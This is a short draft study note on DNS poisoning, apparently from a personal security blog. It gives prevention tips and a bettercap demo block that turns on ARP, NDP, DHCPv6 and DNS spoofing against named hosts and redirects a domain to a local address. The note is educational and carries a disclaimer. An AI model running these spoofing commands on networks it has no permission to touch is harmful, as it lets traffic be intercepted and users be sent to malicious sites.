---
title: "DNS Poisoning - Draft"
weight: 700
date: 2024-06-15T01:47:46+07:00
draft: true
---

# DNS Poisoning Attack

- A type of MitM attack


## Prevention

- Use Secure DNS: Configure DNS servers to use DNSSEC (Domain Name System Security Extensions), which adds cryptographic signatures to DNS records
- Enable HTTPS Everywhere: Even if DNS is poisoned, HTTPS with valid certificates will warn users when a site is untrusted
- Avoid Public Wi-Fi: Public networks are more susceptible to DNS poisoning attacks
- Set Trusted DNS Servers: Use reliable DNS resolvers like Google DNS (8.8.8.8) or Cloudflare (1.1.1.1)
- Monitor and Update Systems: Regularly patch DNS servers and network devices to address vulnerabilities
- Use a VPN: Encrypt traffic, bypassing rogue DNS responses on compromised networks

## Demo

{{<hint danger>}}
**DISCLAIMER**: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content
{{</hint>}}

```sh

set ndp.spoof.neighbour fe80::53a:d4db:13e9:b774
set ndp.spoof.targets 2001:ee0:4f51:2ed0:295c:1995:43bf:3e1b,2001:ee0:4f51:2ed0:c60d:3bd1:19b6:facb

2001:ee0:4f51:2ed0:ed4b:6d8:6bd0:b97f

set dns.spoof.domains mnptt.io.vn
set dns.spoof.address 192.168.1.17

set dhcp6.spoof.domains mnptt.io.vn

set arp.spoof.targets a4:34:d9:89:a0:58

ndp.spoof on
dhcp6.spoof on
dns.spoof on
arp.spoof on

```

## References

- Bettercap: [ndp.spoof (IPv6)](https://www.bettercap.org/modules/ethernet/spoofers/ndp.spoof/)
- Bettercap: [dhcp6.spoof](https://www.bettercap.org/modules/ethernet/spoofers/dhcp6.spoof/)
- Bettercap: [dns.spoof](https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/)
- Bettercap: [arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)